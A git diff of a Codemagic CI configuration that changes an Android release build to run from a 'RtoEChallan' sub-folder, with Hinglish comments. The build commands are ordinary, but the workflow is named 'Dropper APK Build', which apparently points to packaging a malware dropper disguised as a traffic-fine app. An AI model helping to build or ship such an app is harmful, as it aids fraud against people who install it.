@@ -1,4 +1,4 @@
-# Codemagic Automation for Droperapk (Fixed Path)
+# Codemagic Automation - Sub-folder Fix
 workflows:
   android-dropper-build:
     name: Dropper APK Build
@@ -11,23 +11,21 @@ workflows:
     scripts:
       - name: Build Android Release APK
         script: |
-          # Sabse pehle gradlew file ko dhoondo aur us folder mein jao
-          GRADLEW_PATH=$(find . -name gradlew | head -n 1)
-          GRADLEW_DIR=$(dirname "$GRADLEW_PATH")
-          cd "$GRADLEW_DIR"
+          # 1. Sabse pehle sub-folder ke andar jao
+          cd RtoEChallan
           
-          echo "Building in directory: $GRADLEW_DIR"
+          # 2. Check karo ki kya hum sahi jagah hain
+          ls -la
           
-          # Permissions set karo
+          # 3. Gradlew ko permission do aur build shuru karo
           chmod +x gradlew
-          
-          # Build shuru karo
           ./gradlew assembleRelease
 
     artifacts:
-      - "**/build/outputs/apk/release/*.apk"
+      # Artifact path bhi sub-folder ke hisab se
+      - RtoEChallan/app/build/outputs/apk/release/*.apk
 
     publishing:
       scripts:
         - name: Done
-          script: echo "Build Finished!"
+          script: echo "Bhai, sub-folder wala masla hal ho gaya!"
